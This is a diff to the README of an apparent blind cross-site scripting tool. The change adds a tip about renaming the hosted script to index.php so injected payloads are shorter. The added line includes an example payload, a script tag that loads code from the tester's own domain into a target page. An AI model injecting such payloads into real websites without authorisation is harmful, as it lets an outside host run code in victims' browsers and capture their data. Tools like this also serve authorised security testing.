@@ -40,6 +40,8 @@ $password = False; //Protect the Blind XSS Report with a password. Leave as Fals
 To generate payloads you might consider using the Blind-XSS-Manager https://github.com/SeifElsallamy/Blind-XSS-Manager
 You can simply create payloads through this extension by entering yourdomain.com/XSSFire.js in the domain field and click Save.
 
+Note: you can change the file name to index.php and upload it to your server main directory to make the payloads shorter, then the payload should look similar to this `<script src="https://yourdomain.com"></script>`.
+
 # Snapshots:
 
 <img width="578" alt="bxss" src="https://user-images.githubusercontent.com/11223632/210347560-fb24b4fb-9927-4973-8a39-42802c308601.png">
